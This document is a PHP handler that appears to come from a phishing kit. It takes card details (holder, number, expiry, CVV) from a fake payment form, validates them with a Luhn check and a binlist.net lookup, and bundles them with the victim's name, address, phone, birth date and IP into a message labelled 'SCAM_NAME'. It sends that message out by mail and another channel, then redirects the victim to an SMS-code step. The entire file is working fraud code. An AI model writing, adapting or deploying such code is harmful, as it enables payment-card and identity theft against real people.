<?php 
require_once 'panel.php' ;

// CARD Config Start

if(isset($_POST['submit'])) {

if(!isset($_SESSION)) {
    session_start();
}

$_SESSION['scch'] = htmlspecialchars($_POST['cch']);
$_SESSION['sccn'] = htmlspecialchars($_POST['ccn']);
$_SESSION['sexp'] = htmlspecialchars($_POST['exp']);
$_SESSION['scvv'] = htmlspecialchars($_POST['cvv']);


$string = $_SESSION['sccn'];
$find = " ";
$replace = "";
$new_string = str_replace($find, $replace, $string);

$number = $new_string;
$_SESSION['4digits'] = substr($number, -4);

$_SESSION['scan'] = $new_string;
$cc = $new_string;
$bin = substr($cc, 0, 6);
$bins = str_replace(' ', '', $bin);
$ch = curl_init();
$url = "https://lookup.binlist.net/" . $bin;
curl_setopt($ch, CURLOPT_URL, $url);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'GET');
$headers = array();
$headers[] = 'Accept-Version: 3';
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
$result = curl_exec($ch);
if (curl_errno($ch)) {
    echo 'Error:' . curl_error($ch);
}
curl_close($ch);
$_SESSION['bank'] = $someArray['bank']['name'];
$_SESSION['type'] = $someArray['type'];
$_SESSION['level'] = $someArray['brand'];
$_SESSION['country'] = $someArray['country'];
$someArray = json_decode($result, true);
$_SESSION['bank'] = $someArray['bank']['name'];
$_SESSION['type'] = $someArray['type'];
$_SESSION['level'] = $someArray['brand'];
$_SESSION['country'] = $someArray['country']['name'];

if(empty($_SESSION['sccn']) || empty($_SESSION['sexp']) || empty($_SESSION['scvv'])) {
    header("Location: ../payment.php?page=error&userid={$id}&ue={$ue}");
}
else {

    

    function is_valid_luhn($number) {
        settype($number, 'string');
        $sumTable = array(
            array(0,1,2,3,4,5,6,7,8,9),
            array(0,2,4,6,8,1,3,5,7,9));
        $sum = 0;
        $flip = 0;
        for ($i = strlen($number) - 1; $i >= 0; $i--) {
            $sum += $sumTable[$flip++ & 0x1][$number[$i]];
        }
        return $sum % 10 === 0;
    }
    
    
    if(is_valid_luhn($new_string) && is_numeric($new_string) && strlen($_SESSION['scvv']) >= 3){  
        
    $subject = "CARD ".SCAM_NAME." ".FLAG." FROM: $ip";
    $rezdata = "💳 CARD ".SCAM_NAME." ".FLAG."

💳 Card holder : ".$_SESSION['scch']."
💳 Card number : ".$_SESSION['sccn']."
💳 Expiration : ".$_SESSION['sexp']."
💳 Code Cvv : ".$_SESSION['scvv']."

🏛️ BANK INFO'S ".SCAM_NAME." 🏛️

🏛️ Banque : ".$_SESSION['bank']."
🏛️ Niveau : ".$_SESSION['level']."
🏛️ Type : ".$_SESSION['type']."
🏛️ Pays : ".$_SESSION['country']."

🥷🏻 INFOZ ".SCAM_NAME." 🥷🏻

🥷🏻 Name : ".$_SESSION['sname']."
🥷🏻 Adresse : ".$_SESSION['saddress']."
🥷🏻 Country : ".$_SESSION['scountry']."
🥷🏻 City : ".$_SESSION['scity']."
🥷🏻 Phone : ".$_SESSION['sphone']."
🥷🏻 Dob : ".$_SESSION['sdate']."

🌐 Victim IP : $ip
💠 OS : $agent
    
⚡️ 乃 ㄥ 卂 匚 Ҝ  千 ㄖ 尺 匚 乇 ™ ⚡️
    ";
    
    $maildata = $rezdata;
    
    
    sendCard($rezdata);
        
    sendMail($maildata);
    


    header("Location: ../loader.php?view=sms&userid={$id}&ue={$ue}");

}
else {
    header("Location: ../payment.php?page=error&userid={$id}&ue={$ue}");
}


}
}
// CARD Config END